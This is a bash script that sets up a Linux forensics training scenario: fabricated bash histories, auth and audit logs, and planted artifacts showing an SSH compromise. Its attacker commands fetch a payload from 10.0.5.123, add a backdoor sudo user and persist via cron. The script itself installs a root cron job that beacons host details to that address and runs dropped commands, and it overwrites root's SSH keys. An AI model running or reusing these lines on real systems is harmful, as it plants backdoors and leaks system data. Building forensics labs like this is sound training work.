#!/bin/bash
# Setup forensic evidence for the Linux Forensics demo

# Create realistic bash histories

# Alice's history (mix of legitimate and attacker commands)
mkdir -p /home/alice
cat > /home/alice/.bash_history << 'HISTORY'
ls -la
cd /var/www/html
vi index.html
git pull
cd ~
ls -la
id
whoami
cat /etc/passwd
sudo -l
sudo su -
HISTORY
chown alice:alice /home/alice/.bash_history

# Root history (attacker commands after escalation)
cat > /root/.bash_history << 'HISTORY'
id
hostname
cat /etc/passwd
cat /etc/shadow
wget http://10.0.5.123/payload.sh -O /tmp/.update.sh
chmod +x /tmp/.update.sh
/tmp/.update.sh &
useradd -m -s /bin/bash -G sudo backdoor_user
echo "backdoor_user:P@ssw0rd2024!" | chpasswd
echo "* * * * *  root  /tmp/.update.sh" >> /etc/crontab
mkdir -p /root/.ssh
echo "ssh-rsa AAAA...attackerkey== attacker@kali.local" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
history -c
HISTORY

# Create the malicious cron script (simulated)
cat > /tmp/.update.sh << 'SCRIPT'
#!/bin/bash
# "Windows update service" (this is malware!)
curl -s http://10.0.5.123:8080/beacon -d "host=$(hostname)&user=$(id)" > /dev/null 2>&1
if [ -f /tmp/.cmd ]; then
    bash /tmp/.cmd
    rm /tmp/.cmd
fi
SCRIPT
chmod +x /tmp/.update.sh

# Add the malicious cron entry to /etc/crontab
echo "* * * * *  root  /tmp/.update.sh" >> /etc/crontab

# Add attacker's SSH key
mkdir -p /root/.ssh
echo "ssh-rsa AAAA...attackerkey== attacker@kali.local" > /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# Create simulated auth.log with incident evidence
mkdir -p /var/log
cat > /var/log/auth.log << 'AUTHLOG'
Jan 14 14:15:00 server sshd[1100]: Failed password for invalid user admin from 10.0.5.123 port 51234 ssh2
Jan 14 14:15:01 server sshd[1101]: Failed password for invalid user root from 10.0.5.123 port 51235 ssh2
Jan 14 14:20:00 server sshd[1200]: Failed password for alice from 10.0.5.123 port 52000 ssh2
Jan 14 14:20:01 server sshd[1201]: Failed password for alice from 10.0.5.123 port 52001 ssh2
Jan 14 14:23:01 server sshd[1248]: Failed password for alice from 10.0.5.123 port 52247 ssh2
Jan 14 14:47:23 server sshd[2100]: Accepted password for alice from 10.0.5.123 port 54321 ssh2
Jan 14 14:47:23 server sshd[2100]: pam_unix(sshd:session): session opened for user alice
Jan 14 14:47:45 server sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/su -
Jan 14 14:47:55 server sudo: pam_unix(sudo:session): session opened for user root
Jan 14 14:48:30 server useradd[3001]: new user: name=backdoor_user, UID=1002, GID=1002
Jan 14 14:48:35 server passwd[3010]: password changed for backdoor_user
Jan 14 14:49:00 server cron[3100]: (root) RELOAD (/etc/crontab)
Jan 14 14:55:00 server sshd[2100]: pam_unix(sshd:session): session closed for user alice
Jan 15 09:10:00 server sshd[4100]: Accepted password for backdoor_user from 10.0.5.123 port 61234 ssh2
Jan 15 09:10:00 server sshd[4100]: pam_unix(sshd:session): session opened for user backdoor_user
AUTHLOG

# Create simulated audit log
mkdir -p /var/log/audit
cat > /var/log/audit/audit.log << 'AUDITLOG'
type=SYSCALL msg=audit(1705244883.123:100): arch=c000003e syscall=59 success=yes exit=0 a0=5612abc a1=5612def a2=5612fed a3=0 items=2 ppid=2099 pid=2101 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="privileged-sudo"
type=EXECVE msg=audit(1705244883.123:100): argc=3 a0="sudo" a1="su" a2="-"
type=PATH msg=audit(1705244883.123:100): item=0 name="/usr/bin/sudo" inode=131593 nametype=NORMAL
type=SYSCALL msg=audit(1705244883.345:101): arch=c000003e syscall=188 success=yes exit=0 a0=5 a1=bfcd456 a2=bfcd789 a3=4 items=1 ppid=2100 pid=2105 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="chmod" exe="/bin/chmod" subj=unconfined key="identity"
type=PATH msg=audit(1705244883.345:101): item=0 name="/etc/passwd" inode=524289 nametype=NORMAL
type=SYSCALL msg=audit(1705244883.456:102): arch=c000003e syscall=2 success=yes exit=3 a0=5 a1=1 a2=1b6 a3=0 items=1 ppid=3000 pid=3001 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="useradd" exe="/usr/sbin/useradd" subj=unconfined key="identity"
type=PATH msg=audit(1705244883.456:102): item=0 name="/etc/passwd" inode=524289 nametype=NORMAL
type=SYSCALL msg=audit(1705244950.789:200): arch=c000003e syscall=2 success=yes exit=3 a0=5 a1=1 a2=1b6 a3=0 items=1 ppid=3099 pid=3100 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="tee" exe="/usr/bin/tee" subj=unconfined key="scheduled-jobs"
type=PATH msg=audit(1705244950.789:200): item=0 name="/etc/crontab" inode=131586 nametype=NORMAL
AUDITLOG

echo "Forensic setup complete."
